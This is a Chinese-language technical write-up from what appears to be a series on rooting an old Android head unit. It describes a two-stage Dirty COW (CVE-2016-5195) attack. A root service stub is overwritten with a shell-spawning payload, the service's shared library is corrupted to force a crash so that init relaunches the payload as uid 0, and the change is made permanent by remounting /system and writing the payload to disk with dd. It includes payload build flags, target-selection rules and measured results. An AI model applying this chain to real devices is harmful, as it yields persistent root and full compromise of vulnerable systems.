# 03 · Dirty COW 两段式攻击

这条路径**不依赖厂商后门**，是通用思路：用一个已知内核漏洞改掉一个
**由 init 以 root 托管并会自动重启**的二进制，让 init 亲手把我们的代码
以 uid 0 跑起来。

适用前提只有两条：

1. 内核存在 CVE-2016-5195（Dirty COW）
2. 能找到「非 oneshot、非 critical、以 root 运行、文件对 app 可读」的服务

---

## 第一步：确认漏洞真的存在

### 静态：diff 内核源码

把 `mm/memory.c` 的 `__get_user_pages` 和修好的版本对比：

```diff
-   foll_flags &= ~FOLL_WRITE;      /* 3.10.65 —— 有洞 */
+   foll_flags |= FOLL_COW;         /* 3.10.104 —— 已修 */
```

### 动态：必须用「磁盘内容真被改」当判据

`src/cowtest.c` 的做法：

1. `open(path, O_RDONLY)` 打开一个只读文件
2. `mmap(..., PROT_READ, MAP_PRIVATE, fd, 0)`
3. 一个线程在这块映射上反复 `madvise(MADV_DONTNEED)`
4. 主线程往 `/proc/self/mem` 的对应偏移写入
5. **最后用另一个独立的 `open()` + `read()` 判断内容是否真的变了**

实测：

```
原始内容: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD
重新读回: ZZZZZZZZBBBBBBBBCCCCCCCCDDDDDDDD
```

**只看 `write()` 的返回值是假阳性**，必须独立重读。

而且实测在**只读挂载的 `/system`** 上同样有效 —— 因为改的是页缓存，不是块设备。

---

## 第二步：选目标（这一步最容易白干）

### 坑 1：空壳陷阱

厂商的 root 服务二进制很多是**几百到几千字节的空壳**，真正的逻辑在
`lib<name>.so` 里。

```bash
$ ls -l /system/bin/isomountmanagerservice
-rwxr-xr-x root root 5328

$ readelf -d /system/bin/isomountmanagerservice
0x00000001 (NEEDED)  Shared library: [libisomountmanagerservice.so]   ← 真逻辑在这
0x00000001 (NEEDED)  Shared library: [libbinder.so]
...
```

这个空壳只有一个 `LOAD ... R E 0x006d4`（1748 字节的代码段），
`main()` 里只做了一件事：注册 Binder 服务然后进事件循环。
**改它的代码页，对正在跑的进程毫无影响。**

> 教训：动手前先 `readelf -d`。看到 `NEEDED` 指向同名 `.so` 就说明要找的是 `.so`。
>
> 反例：`gocsdk`（592 KB，自包含）就没有这个问题。

### 坑 2：空闲服务改完不会崩（I-cache）

[01-device-recon.md](01-device-recon.md) 里那个「12 个 root 服务全是
0 ticks/6s」的测量，直接判决了下面这件事：

**改完一个空闲服务的代码页，它不会崩。**

原因：这些服务都阻塞在 `poll`/`epoll`，不取指。ARM 的 I-cache 跟数据写不保持一致性，
别的进程写页缓存后，运行中的进程可能仍然执行 I-cache 里的旧指令。
我们实测：`debuggerd` 被改成 `0xFF` 填充后，触发一次进程崩溃去唤醒它，
它 fork 出的子进程死了，但**主进程 pid 一直没变**（它的 poll 循环全在 I-cache 里）。

**解法：主动戳醒它。**

```bash
$ service list | grep -i iso
1  softwinner.isomountmanager: [com.softwinner.IISOMountManagerService]

$ service call softwinner.isomountmanager 1
```

`service call` 会把目标服务从 `poll` 里拽出来走一遍 Binder 分发，
这一步必然要取指 —— Binder 线程里几小时没跑过的代码早就不在 I-cache 了。

> **Binder 服务名 ≠ init 服务名。** init 里叫 `isomountmanager`，
> `service call` 要用 `softwinner.isomountmanager`。

### 坑 3：哪些服务不能碰

`init.rc`（AOSP 4.4.2）里的标志位组合：

| 标志 | 崩溃后行为 |
|---|---|
| `oneshot` | `SVC_DISABLED` → 通知 `stopped`，**永不重启** |
| `critical` | 4 分钟内第 5 次崩溃 → `android_reboot(..., "recovery")` |
| `disabled` | 不影响：`service_start()` 第一行就清掉 `SVC_DISABLED` |
| 其它 | `SVC_RESTARTING` → 重启 |

关于重启延迟有个容易看错的细节：

```c
// init.c:418
static void restart_service_if_needed(struct service *svc) {
    time_t next_start_time = svc->time_started + 5;
    if (next_start_time <= gettime()) { ... service_start(svc, NULL); }
}
```

`time_started` 是 **fork 的时刻**。所以 `+5` 的语义是
「两次启动间隔至少 5 秒」，**不是「崩溃后等 5 秒」**。
对一个已经跑了三小时的常驻服务，`time_started + 5` 早就过去了，
崩溃后是**亚秒级**立刻重启。

必须排除的：`ueventd`、`healthd`、`zygote`、`servicemanager`（`critical`）、
`adbd`（在 ramdisk，够不到）、所有 `oneshot`。

---

## 第三步：两段式攻击（顺序绝对不能反）

```
① COW 把「空壳」改成我们的静态 payload（长度不变，其余填 0xFF）
   → 目的：让 init 之后重启它时，以 root 执行我们的代码
   ⚠ 此刻进程还没死，这个改动不生效

② COW 把「.so」填 0xFF
   → 目的：让正在跑的进程下一次执行 .so 代码时 SIGILL

③ service call <binder名> 1
   → 进程崩 → init 立刻重启空壳（我们的 payload）→ uid 0
```

**顺序反了会怎样：** 进程先崩 → init 重启的是**原厂空壳** → 服务正常恢复，
白改一场。而且 `service call` 之后再 `service call` 会得到
`Service xxx does not exist`（服务已从 servicemanager 注销）。

实测时序：

```
COW 空壳  (0.1s)  ★ 完整写入成功，verify=1
COW .so   (0.1s)  ★ 完整写入成功（阶段2 第 8 轮）
service call      → Service softwinner.isomountmanager does not exist   ← 已经崩了
~15s 后           → ROOT_PROOF.txt 出现 uid=0(root)
```

---

## 第四步：payload 的五条铁律

每一条都是踩过坑换来的。

### 1. `-nostdlib -static`，不要 `PT_INTERP`

```bash
arm-linux-gnueabihf-gcc -nostdlib -static -Wl,-N -Wl,-e,_start \
    -Wl,--build-id=none -o payload payload.S
```

要求：`Type=EXEC`、无 `INTERP`、`p_vaddr >= 0x8000`（大于 `mmap_min_addr`）。

payload 本身只有几十字节 —— 它只干一件事：`execve("/system/bin/sh", ...)`。

### 2. `envp` 必须是非空数组，且含 `PATH`

传 `NULL` 的后果：

```
sh: id: not found
sh: setprop: not found
sh: mount: not found
sh: dd: not found
```

脚本跑完了，但每一个命令都「不存在」。这是最容易误判成「权限不足」的坑。

### 3. 第一件事就是 `execve` 成 sh —— 否则会自杀

payload 进程的代码页**就是被篡改的那个文件的页缓存**。
如果它自己动手去覆盖这个文件，等于改自己正在执行的指令 → 立刻崩。

`execve("/system/bin/sh", ...)` 会替换掉整个地址空间，
之后进程不再映射那个文件，**再覆盖它就安全了**。

所以还原动作必须放在 `sh` 里、而且放在最后。

### 4. 常驻守护要放在 sh 的 `while` 循环里，payload 本身不循环

如果 payload 里写 `while true`，它会占死调用方的执行线程
（我们的控制通道是一次 exec 一次结果），整个 agent 会被拖死。

正确做法：payload 只负责 exec 成 `sh -c "<很长的脚本>"`，
脚本里先做提权动作，**最后**进 `while true` 循环常驻。

### 5. 命令串不能含 `"` 和 `\`

payload 的汇编里命令是 `.asciz "..."`，没法放双引号。
需要引号时用相邻单引号拼接：

```sh
echo '##EXIT='$?'##'
```

推荐用脚本生成汇编再编译（`tools/make_daemon_payload.py`），别手写。

---

## 第五步：持久化（意外但好用）

Dirty COW 改的是页缓存，理论上重启就没了。但实测发现一个副作用：

**一旦把文件系统 `mount -o rw,remount`，被改脏的页会被内核回写进磁盘。**

所以持久化只需要：

```bash
mount -o rw,remount /system
dd if=$B/daemon_payload.new of=/system/bin/<目标空壳>
sync
mount -o ro,remount /system
```

之后每次开机 init 都会启动我们的 payload，自动拿到 root。

实测验证：重启后

```
$ cat ROOT_PROOF.txt
uid=0(root) gid=0(root) groups=1003(graphics),1005(audio),1006(camera),...

$ ls -l /system/bin/isomountmanagerservice
-rwxr-xr-x root root 5328
$ dd if=/system/bin/isomountmanagerservice bs=1 skip=24 count=4
T \0 \1 \0        ← 0x10054，我们的 payload entry（原件是 0x588）
```

**代价**：被替换掉的那个服务永久失效。本例是 `softwinner.isomountmanager`
（USB ISO 镜像挂载），日常完全用不到。
原件备份在 app 私有目录，留了一键还原脚本。

> 如果这台机器有 `/dev/tw` 后门，其实**不需要**做这套持久化 ——
> 见 [02-vendor-backdoor-devt-w.md](02-vendor-backdoor-devt-w.md)。
